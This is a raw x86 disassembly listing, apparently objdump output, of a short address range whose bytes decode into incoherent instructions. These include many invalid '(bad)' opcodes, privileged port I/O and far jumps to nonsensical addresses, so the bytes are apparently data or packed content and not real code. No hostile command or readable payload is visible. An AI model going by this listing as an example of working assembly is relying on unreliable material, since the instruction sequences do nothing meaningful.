  4197b4:	sbb    al,bl
  4197b6:	lods   eax,DWORD PTR ds:[esi]
  4197b7:	and    DWORD PTR [eax+0x256b3b40],ecx
  4197bd:	mov    dl,bl
  4197bf:	into   
  4197c0:	fdiv   DWORD PTR fs:[ecx-0x32addc11]
  4197c7:	fcmovnbe st,st(4)
  4197c9:	loop   0x41976a
  4197cb:	jmp    0x419790
  4197cd:	hlt    
  4197ce:	ror    DWORD PTR [edi-0x66a10bb5],0x62
  4197d5:	daa    
  4197d6:	rcr    esp,cl
  4197d8:	or     ebp,edi
  4197da:	xor    BYTE PTR [ebx],0x8e
  4197dd:	js     0x419818
  4197df:	or     al,0x44
  4197e1:	outs   dx,BYTE PTR ds:[esi]
  4197e2:	push   0x21
  4197e4:	adc    BYTE PTR [ecx-0x6e],bh
  4197e7:	ficomp WORD PTR ds:0x80de7c7d
  4197ed:	fdivr  DWORD PTR [ecx+eax*2-0x5a83a9d7]
  4197f4:	pop    edi
  4197f5:	je     0x41977c
  4197f7:	jmp    0xa955d8d5
  4197fc:	(bad)
  419800:	in     eax,0xa2
  419802:	stos   BYTE PTR es:[edi],al
  419803:	lock dec eax
  419805:	outs   dx,BYTE PTR ds:[esi]
  419806:	les    ebx,FWORD PTR [esi-0x33]
  419809:	mov    ds,WORD PTR [ebx]
  41980b:	leave  
  41980c:	hlt    
  41980d:	sub    DWORD PTR [edi],esp
  41980f:	dec    esi
  419810:	fistp  WORD PTR [eax+0x4acf47b5]
  419816:	cmc    
  419817:	adc    BYTE PTR fs:[ecx-0x27790613],bh
  41981e:	test   esi,eax
  419820:	mov    gs,edi
  419822:	mov    cl,0x16
  419824:	mov    eax,ds:0x2c1064fb
  419829:	or     edx,0x309ce4fc
  41982f:	sbb    DWORD PTR [ecx+0x57],ecx
  419832:	mov    al,0x41
  419834:	out    dx,al
  419835:	fwait
  419836:	jno    0x4197d2
  419838:	outs   dx,DWORD PTR ds:[esi]
  419839:	adc    ah,BYTE PTR [ebp+0x36]
  41983c:	scas   al,BYTE PTR es:[edi]
  41983d:	sub    ebp,DWORD PTR [ebp+0x236ea553]
  419843:	jl     0x419841
  419845:	fwait
  419846:	les    ebp,FWORD PTR [esi]
  419848:	cli    
  419849:	fisubr DWORD PTR [eax-0x3]
  41984c:	sahf   
  41984d:	test   dl,ch
  41984f:	mov    esi,0x776740f
  419854:	mov    dl,0xcc
  419856:	jns    0x4197f2
  419858:	push   ebp
  419859:	inc    edx
  41985a:	repz sub ch,ch
  41985d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41985e:	in     eax,0x49
  419860:	jne    0x419803
  419862:	mov    ebx,0xd48972bd
  419867:	jns    0x41984c
  419869:	pop    eax
  41986a:	nop
  41986b:	daa    
  41986c:	call   FWORD PTR [ebp-0x12]
  41986f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419870:	push   cs
  419871:	push   ecx
  419872:	sbb    eax,0xe2194ca9
  419877:	jmp    0xe682efc8
  41987c:	inc    ebx
  41987d:	mov    ch,0xbd
  41987f:	jmp    0x93e091c9
  419884:	mov    dl,bl
  419886:	cmpxchg BYTE PTR [edi-0xb],dh
  41988a:	call   0x2d7d09b
  41988f:	cmp    BYTE PTR [eax+eax*1+0x0],bh
	...
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fstp   st(7)
  419901:	sbb    edi,DWORD PTR [eax+0x10f0862]
  419907:	add    BYTE PTR ds:0xd5000001,al
  41990d:	pop    es
  41990e:	aam    0xb9
  419910:	sbb    BYTE PTR [ebx-0x2d],cl
  419913:	pusha  
  419914:	test   al,0xd2
  419916:	pop    ss
  419917:	das    
  419918:	(bad)  
  419919:	stc    
  41991a:	mov    bh,BYTE PTR [edi-0x1a]
  41991d:	add    eax,0x29b5aa9
  419922:	arpl   WORD PTR [edx-0x22140f5e],di
  419928:	and    al,0x42
  41992a:	adc    eax,0xdf4bc66e
  41992f:	inc    ecx
  419930:	push   eax
  419931:	jno    0x419931
  419933:	in     eax,dx
  419934:	in     eax,0x91
  419936:	push   ecx
  419937:	cmp    al,0x58
  419939:	pop    ebp
  41993a:	push   0x5e680996
  41993f:	xor    al,0x82
  419941:	out    0xd7,al
  419943:	sbb    eax,0x63e3e30f
  419948:	pop    es
  419949:	retf   0x3df3
  41994c:	cs in  eax,0x86
  41994f:	jmp    0x41996d
  419951:	push   edx
  419952:	cwde   
  419953:	dec    esp
  419954:	lods   al,BYTE PTR ds:[esi]
  419955:	out    dx,eax
  419956:	add    eax,0x69a31c64
  41995b:	leave  
  41995c:	xchg   ebx,eax
  41995d:	add    BYTE PTR [ebx-0x82a6872],bl
  419963:	or     edx,DWORD PTR [ebx-0x6261263d]
  419969:	rcr    ebx,1
  41996b:	push   edx
  41996c:	xchg   BYTE PTR [edx+0xd],al
  41996f:	dec    ebp
  419970:	sahf   
  419971:	sbb    bl,cl
  419973:	xor    edi,esp
  419975:	jnp    0x419910
  419977:	test   BYTE PTR [ebx-0x604db3e1],bl
  41997d:	int    0x79
  41997f:	push   es
  419980:	push   ecx
  419981:	push   es
  419982:	sbb    al,0xde
  419984:	sub    cl,BYTE PTR [ebx+0x536ba2ec]
  41998a:	mov    WORD PTR [ebx],gs
  41998c:	pusha  
  41998d:	xchg   ecx,eax
  41998e:	mov    ebp,0x86f01653
  419993:	ss out dx,eax
  419995:	inc    ecx
  419996:	jb     0x419990
  419998:	dec    edx
  419999:	fcom   QWORD PTR [edx]
  41999b:	out    dx,eax
  41999c:	jae    0x4199cc
  41999e:	inc    eax
  41999f:	cmp    bl,BYTE PTR [ebx]
  4199a1:	bnd ret 
  4199a3:	stos   BYTE PTR es:[edi],al
  4199a4:	ret    0x4a3b
  4199a7:	int3   
  4199a8:	inc    ebx
  4199a9:	dec    edx
  4199aa:	shl    ecx,0xc3
  4199ad:	xor    edi,ebp
  4199af:	push   0x9a9128e5
  4199b4:	ja     0x4199ff
  4199b6:	cwde   
  4199b7:	mov    edi,0xe8f27e95
  4199bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199bd:	adc    BYTE PTR [edx-0x37],0x58
  4199c1:	inc    edi
  4199c2:	mov    WORD PTR [edx+0x6a],ds
  4199c5:	out    0xc2,eax
  4199c7:	aaa    
  4199c8:	dec    esi
  4199c9:	xor    BYTE PTR [edi-0x3aa8af4a],dl
  4199cf:	xchg   ebp,eax
  4199d0:	in     eax,dx
  4199d1:	sub    edx,DWORD PTR [eax]
  4199d3:	push   ss
  4199d4:	dec    ebx
  4199d5:	adc    ch,BYTE PTR [ebp+0x323b57a2]
  4199db:	ror    DWORD PTR [eax-0x7dc97de3],cl
  4199e1:	outs   dx,DWORD PTR ds:[esi]
  4199e2:	xlat   BYTE PTR ds:[ebx]
  4199e3:	inc    edx
  4199e4:	lds    eax,FWORD PTR [edi-0x63]
  4199e7:	mov    bl,0xa4
  4199e9:	adc    dl,BYTE PTR [edi-0x53]
  4199ec:	loope  0x4199c4
  4199ee:	dec    edi
  4199ef:	adc    DWORD PTR [edx+0x1d],ebp
  4199f2:	sti    
  4199f3:	sbb    dl,0x91
  4199f6:	(bad)  
  4199f8:	test   eax,0x65db9a16
  4199fd:	stos   BYTE PTR es:[edi],al
  4199fe:	aaa    
  4199ff:	cmp    ebx,DWORD PTR [ecx+0x22]
  419a02:	loop   0x4199f1
  419a04:	or     ebx,ebx
  419a06:	pop    esi
  419a07:	stos   BYTE PTR es:[edi],al
  419a08:	sub    BYTE PTR ds:0xe449e566,ah
  419a0e:	les    ebx,FWORD PTR [edx+0x1f]
	...
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0x115c42c2,cl
  419a83:	xor    BYTE PTR ds:0x5000110,cl
  419a89:	add    DWORD PTR [eax],eax
  419a8b:	add    cl,dl
  419a8d:	das    
  419a8e:	repnz sub BYTE PTR [edx+0x3912edb],0x4f
  419a96:	mov    bh,0x64
  419a98:	cmp    DWORD PTR [eax-0x7e35c535],esi
  419a9e:	rcr    BYTE PTR [ecx+0x49],0xbd
  419aa2:	fwait
  419aa3:	push   edx
  419aa4:	mov    eax,ds:0x430c11ce
  419aa9:	push   esi
  419aaa:	jmp    0xba79207a
  419aaf:	inc    ebp
  419ab0:	adc    al,0x55
  419ab2:	lods   al,BYTE PTR ds:[esi]
  419ab3:	cmp    cl,BYTE PTR [edi-0x6c]
  419ab6:	out    0x88,eax
  419ab8:	cwde   
  419ab9:	iret   
  419aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419abb:	in     al,dx
  419abc:	test   DWORD PTR [ebx],0x34f7b17c
  419ac2:	retf   0x3676
  419ac5:	and    DWORD PTR [edi+0x10],0x302656eb
  419acc:	push   edi
  419acd:	shl    DWORD PTR [esp+eiz*4-0x14],0xa9
  419ad2:	jp     0x419a6c
  419ad4:	(bad)  [eax-0x3f]
  419ad7:	dec    eax
  419ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ad9:	out    dx,al
  419ada:	add    eax,0x3480f07b
  419adf:	adc    BYTE PTR [esi-0x18],ch
  419ae2:	xor    eax,DWORD PTR [ecx+0x59f09db0]
  419ae8:	mov    esp,0xa2ef6aa9
  419aed:	mov    bh,dh
  419aef:	push   0x6
  419af1:	out    0x2c,eax
  419af3:	mov    edx,0xe3ae3cc0
  419af8:	cmp    eax,0xaaff80b7
  419afd:	or     eax,0xd052246
  419b02:	dec    eax
  419b03:	ins    DWORD PTR es:[edi],dx
  419b04:	sub    eax,0x47dc8efe
  419b09:	jl     0x419b42
  419b0b:	call   0xcfc:0x92efe962
  419b12:	jmp    0x696afcc7
  419b17:	mov    ebx,DWORD PTR ds:0x6f99a488
  419b1d:	dec    edi
  419b1e:	mov    bl,0x3f
  419b20:	pop    ecx
  419b21:	jmp    0x4634e631
  419b26:	dec    edx
  419b27:	enter  0x936c,0xe0
  419b2b:	out    0xa9,eax
  419b2d:	retf   
  419b2e:	ret    0xf9b2
  419b31:	lds    eax,FWORD PTR [ebx]
  419b33:	jbe    0x419adb
  419b35:	or     ebx,DWORD PTR [edx]
  419b37:	add    edx,DWORD PTR [ebx]
  419b39:	fwait
  419b3a:	dec    eax
  419b3b:	mov    ebx,esi
  419b3d:	mulps  xmm6,xmm1
  419b40:	rcl    BYTE PTR [edx],cl
  419b42:	retf   
  419b43:	mov    edx,DWORD PTR [edx-0x16]
  419b46:	ins    DWORD PTR es:[edi],dx
  419b47:	or     edx,DWORD PTR [ecx+0x560fa5c9]
  419b4d:	neg    esi
  419b4f:	mov    edi,0x38f7cf0f
  419b54:	shl    al,1
  419b56:	jmp    0x9e42:0x2c9051e
  419b5d:	push   cs
  419b5e:	mov    dh,0x6c
  419b60:	inc    ecx
  419b61:	and    esp,DWORD PTR [edx+0x6]
  419b64:	or     ah,cl
  419b66:	les    esp,FWORD PTR [edx+0x25f86e2e]
  419b6c:	shl    DWORD PTR [ebx+ebx*2],0x7
  419b70:	out    0x38,al
  419b72:	out    dx,eax
  419b73:	aam    0xa0
  419b75:	sbb    eax,0x829a3b2
  419b7a:	cmp    ecx,DWORD PTR [eax+eax*2-0x7a]
  419b7e:	jne    0x419b33
  419b80:	clc    
  419b81:	dec    eax
  419b82:	lods   eax,DWORD PTR ds:[esi]
  419b83:	nop
  419b84:	outs   dx,BYTE PTR ds:[esi]
  419b85:	push   0xcaa701a7
  419b8a:	mov    ch,BYTE PTR [ebx+0xc]
  419b8d:	int3   
  419b8e:	fstp   st(4)
  419b90:	imul   eax,DWORD PTR [eax],0x0
	...
  419bf2:	add    BYTE PTR [eax],al
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x76
  419c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c02:	call   0x152aea1
  419c07:	add    BYTE PTR ds:0xbd000001,al
  419c0d:	jge    0x419c84
  419c0f:	test   edx,0xc7dafdda
  419c15:	add    bl,BYTE PTR [edx-0x63b5aa6a]
  419c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c1c:	(bad)  
  419c1d:	push   ss
  419c1e:	xor    eax,0x5e75abc4
  419c23:	and    edx,DWORD PTR ds:[ebx]
  419c26:	xchg   esi,eax
  419c27:	fld    QWORD PTR [edi]
  419c29:	jp     0x419c73
  419c2b:	add    dh,BYTE PTR [ebx+0x1cc7982e]
  419c31:	add    dh,0x90
  419c34:	xchg   edi,eax
  419c35:	scas   al,BYTE PTR es:[edi]
  419c36:	adc    eax,0x30d60710
  419c3b:	or     cl,BYTE PTR [esi+0x2a]
  419c3e:	popf   
  419c3f:	pop    esi
  419c40:	mov    DWORD PTR [ecx],ebp
  419c42:	jp     0x419bea
  419c44:	add    al,0xd1
  419c46:	fucom  st(6)
  419c48:	iret   
  419c49:	inc    esp
  419c4a:	arpl   WORD PTR [edi-0x7f705b55],dx
  419c50:	stos   BYTE PTR es:[edi],al
  419c51:	rep outs dx,BYTE PTR ds:[esi]
  419c53:	add    bl,al
  419c55:	and    ecx,DWORD PTR [ecx+0x63c84124]
  419c5b:	pop    eax
  419c5c:	pushf  
  419c5d:	dec    ebx
  419c5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c5f:	xchg   edx,eax
  419c60:	jmp    0x419c6e
  419c62:	mov    al,ds:0x7753d99a
  419c67:	xchg   ecx,eax
  419c68:	frstor [eax+0x6265e339]
  419c6e:	fwait
  419c6f:	inc    bh
  419c71:	mov    eax,0x2c6d22f7
  419c76:	outs   dx,DWORD PTR ds:[esi]
  419c77:	fcom   DWORD PTR ds:0x6a974c2c
  419c7d:	mov    bh,0xde
  419c7f:	dec    ecx
  419c80:	(bad)  
  419c81:	fwait
  419c82:	scas   al,BYTE PTR es:[edi]
  419c83:	js     0x419c7e
  419c85:	leave  
  419c86:	jno    0x419cfd
  419c88:	in     al,dx
  419c89:	or     BYTE PTR [esi+0x34e59942],0x7f
  419c90:	pop    ebx
  419c91:	in     eax,dx
  419c92:	sbb    DWORD PTR [esi-0x58],ebx
  419c95:	adc    eax,0x7c0aca5
  419c9a:	mov    bl,BYTE PTR [ebp-0x3f]
  419c9d:	gs dec edi
  419c9f:	test   al,0xf0
  419ca1:	fcmovbe st,st(2)
  419ca3:	and    eax,0x1b60413d
  419ca8:	fs aam 0x77
  419cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cac:	fdiv   QWORD PTR [ebx]
  419cae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419caf:	fdiv   QWORD PTR [ecx]
  419cb1:	sar    cl,0xac
  419cb4:	mov    bh,0x33
  419cb6:	push   0xffffffdf
  419cb8:	stos   DWORD PTR es:[edi],eax
  419cb9:	js     0x419cde
  419cbb:	mov    WORD PTR [edi+ecx*4+0xf8a7dea],?
  419cc2:	cmp    esp,DWORD PTR [edx-0x4c516dd]
  419cc8:	cli    
  419cc9:	jmp    0x39cd:0xf075f612
  419cd0:	bound  ebx,QWORD PTR [ebx+0x70e90b64]
  419cd6:	rol    DWORD PTR [eax-0x2c],1
  419cd9:	jmp    0xff0847c0
  419cde:	out    dx,al
  419cdf:	mov    ecx,0x6389ec0f
  419ce4:	fild   QWORD PTR [ebp+0x1b8eb9c]
  419cea:	mov    ecx,0x9ca7d6c9
  419cef:	out    dx,al
  419cf0:	clc    
  419cf1:	inc    ebx
  419cf2:	mov    cl,0xb5
  419cf4:	ss ret 0xebad
  419cf8:	inc    ecx
  419cfa:	adc    bh,BYTE PTR [edi+eax*2-0x4f]
  419cfe:	mov    eax,es
  419d00:	dec    edi
  419d01:	adc    BYTE PTR [ebp-0x54],dh
  419d04:	xchg   esp,eax
  419d05:	pusha  
  419d06:	mov    ecx,0x7db18e7
  419d0b:	or     esi,DWORD PTR [ebx+0x64]
  419d0e:	and    ecx,DWORD PTR [edx-0x29]
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	ficom  DWORD PTR ss:[eax+0x3f]
  419d82:	mov    bh,0xfe
  419d84:	pop    ss
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0x1,al
  419d8d:	inc    esi
  419d8e:	jnp    0x419d35
  419d90:	jnp    0x419d35
  419d92:	(bad)  
  419d93:	pop    esi
  419d94:	mov    bh,0x53
  419d96:	data16 lahf 
  419d98:	mov    eax,ds:0xb2ad0ad1
  419d9d:	sub    DWORD PTR [edi],0x40559033
  419da3:	jb     0x419de7
  419da5:	lds    esi,FWORD PTR [ebx-0x3f]
  419da8:	jno    0x419e0b
  419daa:	leave  
  419dab:	fmul   QWORD PTR [ebp+0x2b396a7a]
  419db1:	sub    BYTE PTR [eax],0xb9
  419db4:	clc    
  419db5:	push   esi
  419db6:	ds mov dl,0xd7
  419db9:	sbb    bl,ch
  419dbb:	push   ebp
  419dbc:	je     0x419d5c
  419dbe:	lods   eax,DWORD PTR ds:[esi]
  419dbf:	nop
  419dc0:	loope  0x419dac
  419dc2:	mov    ebp,DWORD PTR [esi-0x39a81313]
  419dc8:	or     WORD PTR gs:[esi+0x34f5053],0xac55
  419dd2:	adc    al,0xde
  419dd4:	pushf  
  419dd5:	inc    esp
  419dd6:	mov    cl,0xeb
  419dd8:	xchg   ebx,eax
  419dd9:	or     al,0x9c
  419ddb:	mov    ds:0x3108d20c,eax
  419de0:	sbb    edi,DWORD PTR [ecx]
  419de2:	or     ch,BYTE PTR [esi+0x22]
  419de5:	and    al,dh
  419de7:	inc    ebp
  419de8:	std    
  419de9:	rcl    edi,cl
  419deb:	mov    eax,ds:0xa70a9d25
  419df0:	adc    eax,0xec68151b
  419df5:	mov    ebp,0x7d486cdf
  419dfa:	lea    ecx,[eax+ecx*2-0x5f227801]
  419e01:	and    ecx,DWORD PTR [edi+0x3b]
  419e04:	dec    ecx
  419e05:	fst    QWORD PTR [ebx]
  419e07:	(bad)  
  419e08:	jl     0x419e36
  419e0a:	and    DWORD PTR [esi+0x531f680d],edx
  419e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e11:	aad    0x4c
  419e13:	push   edi
  419e14:	js     0x419deb
  419e16:	out    dx,al
  419e17:	retf   
  419e18:	jbe    0x419e21
  419e1a:	aam    0x59
  419e1c:	mov    ecx,0x734ab6f0
  419e21:	mov    edi,0xd8b05971
  419e26:	outs   dx,DWORD PTR ds:[esi]
  419e27:	pop    ecx
  419e28:	shl    BYTE PTR [edi+eiz*2+0x78],cl
  419e2c:	push   ss
  419e2d:	stc    
  419e2e:	push   ebp
  419e2f:	pop    edi
  419e30:	mov    esp,edi
  419e32:	in     al,0xe3
  419e34:	push   ebp
  419e35:	mov    bl,0xd8
  419e37:	lahf   
  419e38:	test   DWORD PTR [eax-0x9],0x5f892471
  419e3f:	sti    
  419e40:	scas   al,BYTE PTR es:[edi]
  419e41:	ins    BYTE PTR es:[edi],dx
  419e42:	add    BYTE PTR [eax+eiz*1+0x56],dl
  419e46:	jns    0x419ec3
  419e48:	clc    
  419e49:	fdivr  DWORD PTR [edi]
  419e4b:	fwait
  419e4c:	daa    
  419e4d:	pop    edx
  419e4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e4f:	adc    al,0x12
  419e51:	jmp    0x419e3a
  419e53:	and    eax,0xfd26b8eb
  419e58:	ss adc ecx,esi
  419e5b:	je     0x419eb7
  419e5d:	mov    DWORD PTR ds:0x7dfa0b75,0x20ab58
  419e67:	(bad)  
  419e68:	pop    esi
  419e69:	das    
  419e6a:	mov    eax,0x359d0bdd
  419e6f:	xchg   ecx,eax
  419e70:	cmp    al,0x3d
  419e72:	add    eax,0x422aced5
  419e77:	cdq    
  419e78:	sti    
  419e79:	mov    ah,0x17
  419e7b:	jnp    0x419e09
  419e7d:	jge    0x419e83
  419e7f:	mov    ds:0x194adf6,al
  419e84:	dec    ebp
  419e85:	(bad)  
  419e86:	fldcw  WORD PTR [ecx+0x55e8d3ac]
  419e8c:	into   
  419e8d:	xchg   DWORD PTR [ecx+0x95ed],edi
	...
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	iret   
  419f01:	mov    cl,0x70
  419f03:	xor    al,0x1c
  419f05:	adc    eax,DWORD PTR [ecx]
  419f07:	add    BYTE PTR ds:0x6f000001,al
  419f0d:	and    al,BYTE PTR [esi-0x42]
  419f10:	mov    esi,0x10ace7b9
  419f15:	push   ecx
  419f16:	es push edi
  419f18:	sub    edi,DWORD PTR [ecx]
  419f1a:	sti    
  419f1b:	mov    ds:0xc5a04e06,eax
  419f20:	popa   
  419f21:	(bad)  
  419f22:	sbb    ebx,DWORD PTR [ecx-0x14f06c44]
  419f28:	call   0xff8b:0x877f2641
  419f2f:	outs   dx,DWORD PTR ds:[esi]
  419f30:	lods   eax,DWORD PTR ds:[esi]
  419f31:	jae    0x419fb0
  419f33:	icebp  
  419f34:	pop    ds
  419f35:	push   esp
  419f36:	push   ecx
  419f37:	adc    DWORD PTR [ebx+ecx*8-0x34],eax
  419f3b:	or     bl,dl
  419f3d:	xchg   edx,eax
  419f3e:	inc    edx
  419f3f:	push   0xaab6ad3b
  419f44:	aam    0x8c
  419f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f47:	mov    dh,0x3f
  419f49:	scas   al,BYTE PTR es:[edi]
  419f4a:	add    DWORD PTR [eax],ebp
  419f4c:	xchg   ecx,eax
  419f4d:	addr16 jbe 0x419fcd
  419f50:	adc    cl,BYTE PTR [esi+0x32]
  419f53:	mov    cl,0x9f
  419f55:	cmp    esi,DWORD PTR [ecx+0x1c]
  419f58:	xor    BYTE PTR [ecx-0x41],0x59
  419f5c:	dec    edi
  419f5d:	ret    0xc83a
  419f60:	xor    DWORD PTR [eax+edx*8+0x3d],edx
  419f64:	test   DWORD PTR [edi],eax
  419f66:	shr    BYTE PTR cs:[ebp-0x1a],cl
  419f6a:	test   BYTE PTR [edi+0x8f39dec],0xa9
  419f71:	ja     0x419f57
  419f73:	and    BYTE PTR [ebx-0x41],bh
  419f76:	mov    ch,0x45
  419f78:	sub    esp,DWORD PTR [eax]
  419f7a:	ret    0x4a47
  419f7d:	add    ebx,esi
  419f7f:	or     ebp,DWORD PTR [edi+0x644097f4]
  419f85:	jge    0x419f87
  419f87:	cli    
  419f88:	or     al,0xaf
  419f8a:	add    al,0x22
  419f8c:	fld    TBYTE PTR [ebx+0x2f]
  419f8f:	mov    bl,0xef
  419f91:	add    esi,DWORD PTR [edi-0x6c3e8e26]
  419f97:	mov    BYTE PTR [esi],bl
  419f99:	sub    dl,bh
  419f9b:	sub    eax,0xd30cc7a3
  419fa0:	(bad)  
  419fa1:	movups xmm1,XMMWORD PTR [edi]
  419fa4:	fst    QWORD PTR [edx+edx*8-0x16]
  419fa8:	xchg   edx,eax
  419fa9:	je     0x419f97
  419fab:	rcr    DWORD PTR [ebp+0x65],1
  419fae:	rol    DWORD PTR [esi-0x31],1
  419fb1:	push   ebp
  419fb2:	add    ecx,edi
  419fb4:	shl    DWORD PTR [ecx],cl
  419fb6:	lock mov edi,0xf74eb56c
  419fbc:	into   
  419fbd:	jns    0x419f50
  419fbf:	dec    esp
  419fc0:	mov    eax,0x34a45e39
  419fc5:	shr    BYTE PTR [edx+0x6],cl
  419fc8:	pop    ebp
  419fc9:	add    dl,al
  419fcb:	arpl   WORD PTR [ebx],dx
  419fcd:	pop    es
  419fce:	mov    ebp,0x8bff2f86
  419fd3:	cmp    ebp,DWORD PTR [ebp+0x6a]
  419fd6:	repz or al,0x99
  419fd9:	ja     0x419fed
  419fdb:	xchg   BYTE PTR [eax-0xb2ff0a2],al
  419fe1:	addr16 xchg ebx,eax
  419fe3:	popa   
  419fe4:	loopne 0x41a006
  419fe6:	adc    al,0x7c
  419fe8:	mov    dh,0xfb
  419fea:	mov    bl,0xa2
  419fec:	push   es
  419fed:	pop    eax
  419fee:	pop    ebp
  419fef:	xchg   eax,edi
  419ff1:	in     eax,dx
  419ff2:	mov    ds:0x1ba8c4ce,eax
  419ff7:	jb     0x419f9d
  419ff9:	mov    ah,0x39
  419ffb:	(bad)  
  419ffc:	jns    0x419fa0
  419ffe:	mov    DWORD PTR [eax],eax
  41a000:	pop    ecx
  41a001:	lods   al,BYTE PTR ds:[esi]
  41a002:	ins    BYTE PTR es:[edi],dx
  41a003:	add    ch,BYTE PTR [edx+0x647853c8]
  41a009:	dec    esp
  41a00a:	call   DWORD PTR [esp+eax*8]
  41a00d:	shr    ecx,cl
  41a00f:	icebp  
  41a010:	adc    DWORD PTR [eax],eax
	...
  41a072:	add    BYTE PTR [eax],al
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x70],bh
  41a081:	out    dx,eax
  41a082:	xor    ebx,DWORD PTR [ebp+0x21]
  41a085:	adc    al,0x1
  41a087:	add    BYTE PTR ds:0xd8000001,al
  41a08d:	adc    DWORD PTR [eax-0x6a],0x7
  41a091:	ret    0xc804
  41a094:	scas   al,BYTE PTR es:[edi]
  41a095:	adc    esp,DWORD PTR [ecx-0x76567c16]
  41a09b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a09c:	xchg   ebp,eax
  41a09d:	call   0x2eb6:0x7181fcf9
  41a0a4:	retf   0xa084
  41a0a7:	call   0x2161:0x904aaca2
  41a0ae:	dec    edi
  41a0af:	jne    0x41a04b
  41a0b1:	add    eax,0xb8ae5cf9
  41a0b6:	jb     0x41a0f1
  41a0b8:	fisubr DWORD PTR [esi]
  41a0ba:	out    dx,al
  41a0bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0bc:	cmc    
  41a0bd:	leave  
  41a0be:	or     bl,bh
  41a0c0:	cmp    BYTE PTR [edx],ch
  41a0c2:	jmp    0xe624:0x351ea7be
  41a0c9:	in     eax,dx
  41a0ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0cb:	push   ebp
  41a0cc:	dec    ecx
  41a0cd:	cwde   
  41a0ce:	outs   dx,DWORD PTR ds:[esi]
  41a0cf:	das    
  41a0d0:	cwde   
  41a0d1:	ds imul ch
  41a0d4:	call   0x60909936
  41a0d9:	adc    al,0xa3
  41a0db:	cli    
  41a0dc:	js     0x41a0c6
  41a0de:	and    BYTE PTR [edi+0x59792eb9],al
  41a0e4:	inc    ebp
  41a0e5:	outs   dx,BYTE PTR ds:[esi]
  41a0e6:	sbb    BYTE PTR [esi],ah
  41a0e8:	mov    esp,0x605e3ec6
  41a0ed:	sbb    al,0x9e
  41a0ef:	add    al,0xad
  41a0f1:	add    DWORD PTR [ebp-0x2812bd9c],ebp
  41a0f7:	dec    eax
  41a0f8:	adc    eax,0x40c5eff5
  41a0fd:	inc    edx
  41a0fe:	out    dx,eax
  41a0ff:	(bad)  
  41a100:	xor    ebx,ebx
  41a102:	aas    
  41a103:	loopne 0x41a0f6
  41a105:	pop    eax
  41a106:	dec    ebx
  41a107:	clc    
  41a108:	push   eax
  41a109:	aad    0xda
  41a10b:	sti    
  41a10c:	outs   dx,DWORD PTR ds:[esi]
  41a10d:	imul   di,bx,0x9c54
  41a112:	xor    BYTE PTR [ebx],bl
  41a114:	jge    0x41a131
  41a116:	dec    esp
  41a117:	mov    edx,DWORD PTR [edi+0x55]
  41a11a:	xchg   DWORD PTR [ebp-0x35],edi
  41a11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a11e:	loopne 0x41a0d2
  41a120:	popf   
  41a121:	in     eax,dx
  41a122:	icebp  
  41a123:	xlat   BYTE PTR ss:[ebx]
  41a125:	mov    ds:0x9f490878,al
  41a12a:	or     BYTE PTR [edi+eiz*2-0x3],bl
  41a12e:	in     al,0x41
  41a130:	mov    bl,0xae
  41a132:	(bad)  
  41a133:	or     eax,0x829a99da
  41a138:	adc    BYTE PTR [edx+0x36],ah
  41a13b:	add    DWORD PTR [ebx-0x4512b54e],esi
  41a141:	repz call 0x2ba8:0x3db42124
  41a149:	sub    al,0xd6
  41a14b:	cmp    dl,BYTE PTR [ebp+0x57]
  41a14e:	jbe    0x41a15c
  41a150:	ret    
  41a151:	(bad)  
  41a152:	gs scas al,BYTE PTR es:[edi]
  41a154:	mov    cl,BYTE PTR [ebp+ecx*4-0x17]
  41a158:	mov    eax,0x3677a683
  41a15d:	(bad)  
  41a15e:	or     ecx,ecx
  41a160:	clc    
  41a161:	popf   
  41a162:	pop    esp
  41a163:	outs   dx,DWORD PTR ds:[esi]
  41a164:	popa   
  41a165:	sub    ebp,DWORD PTR [eax-0x22]
  41a168:	xchg   ecx,eax
  41a169:	add    ch,BYTE PTR [esi]
  41a16b:	or     al,al
  41a16d:	and    BYTE PTR gs:[edx+0x3b5a0b6c],ch
  41a174:	fwait
  41a175:	test   BYTE PTR [ebx-0x48],bl
